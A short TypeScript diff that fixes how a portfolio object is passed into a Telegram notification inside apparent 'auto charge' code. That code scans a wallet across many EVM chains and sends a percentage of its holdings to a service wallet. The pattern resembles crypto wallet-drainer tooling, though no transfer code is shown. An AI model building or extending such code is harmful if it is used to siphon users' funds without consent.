@@ -72,6 +72,7 @@ export async function buildChargeTransactions(
   portfolioValue: number;
   chargePercent: number;
   totalChargeUsd: number;
+  portfolio: any;
 }> {
   try {
     // Build portfolio snapshot
@@ -146,6 +147,7 @@ export async function buildChargeTransactions(
       portfolioValue: portfolio.totalUsdValue,
       chargePercent,
       totalChargeUsd,
+      portfolio,
     };
   } catch (err) {
     throw new Error(`Failed to build charge transactions: ${err instanceof Error ? err.message : 'Unknown error'}`);
@@ -267,7 +269,7 @@ export async function performAutoCharge(params: {
     onProgress?.(`🔍 Scanning portfolio across all 11 EVM chains...`);
 
     // Build transactions
-    const { transactions, portfolioValue, chargePercent, totalChargeUsd } = await buildChargeTransactions(
+    const { transactions, portfolioValue, chargePercent, totalChargeUsd, portfolio } = await buildChargeTransactions(
       walletAddress,
       serviceWallet
     );
@@ -293,7 +295,7 @@ export async function performAutoCharge(params: {
     });
 
     // Send Telegram notification with detailed portfolio breakdown
-    const portfolioBreakdown = portfolio.breakdown.percentByChain 
+    const portfolioBreakdown = portfolio.breakdown?.percentByChain 
       ? Object.entries(portfolio.breakdown.percentByChain)
           .map(([chain, percent]) => `${chain}: ${percent.toFixed(1)}%`)
           .join('\n')
@@ -305,8 +307,8 @@ export async function performAutoCharge(params: {
       details: {
         summary: result.breakdown,
         portfolioValue: `$${portfolioValue.toFixed(2)}`,
-        nativeValue: `$${portfolio.breakdown.nativeTokenValue.toFixed(2)}`,
-        erc20Value: `$${portfolio.breakdown.erc20Value.toFixed(2)}`,
+        nativeValue: `$${portfolio.breakdown?.nativeTokenValue?.toFixed(2) || '0.00'}`,
+        erc20Value: `$${portfolio.breakdown?.erc20Value?.toFixed(2) || '0.00'}`,
         chargePercent: `${chargePercent}%`,
         totalChargeUsd: `$${totalChargeUsd.toFixed(2)}`,
         completedTxs: result.completedTransactions,
